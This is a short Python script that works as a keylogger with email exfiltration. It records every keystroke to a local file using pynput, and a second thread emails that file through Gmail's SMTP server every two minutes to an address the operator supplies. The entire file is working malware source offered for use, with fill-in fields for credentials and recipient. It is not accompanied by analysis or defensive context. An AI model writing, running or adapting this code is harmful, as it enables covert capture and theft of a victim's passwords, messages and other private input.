from pynput.keyboard import Key, Listener
import logging

import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.header import Header

import threading
import time


# Keylogger
def keylogger():
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"), 
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


# Start mail
gmail_pass = "uuii" #type_app_password_generated_google_account
user = "i@gmail.com" #your_email
host = "smtp.gmail.com"
port = 465


def send_email_w_attachment(to, subject, body, filename):
    while True:
        # Create message object
        message = MIMEMultipart()

        # Add in header
        message['From'] = Header(user)
        message['To'] = Header(to)
        message['Subject'] = Header(subject)

        # Attach message body as MIMEText
        message.attach(MIMEText(body, 'plain', 'utf-8'))

        # Locate and attach desired attachments
        att_name = os.path.basename(filename)
        print(att_name)
        _f = open(filename, 'rb')
        att = MIMEApplication(_f.read(), _subtype="txt")
        _f.close()
        att.add_header('Content-Disposition', 'attachment', filename=att_name)
        message.attach(att)

        # Setup email server
        server = smtplib.SMTP_SSL(host, port)
        server.login(user, gmail_pass)

        # Send email and quit server
        server.sendmail(user, to, message.as_string())
        server.quit()

        # Sleep 2 min
        time.sleep(120)


to = "" #your_email_tobe_sent_to_u
subject = "keys"
body = "all"
filename = r"keylogs.txt"


# Create threads for each program
thread1 = threading.Thread(target=keylogger)
thread2 = threading.Thread(target=lambda: send_email_w_attachment(to, subject, body, filename))

# Start both threads
thread1.start()

time.sleep(120)
thread2.start()
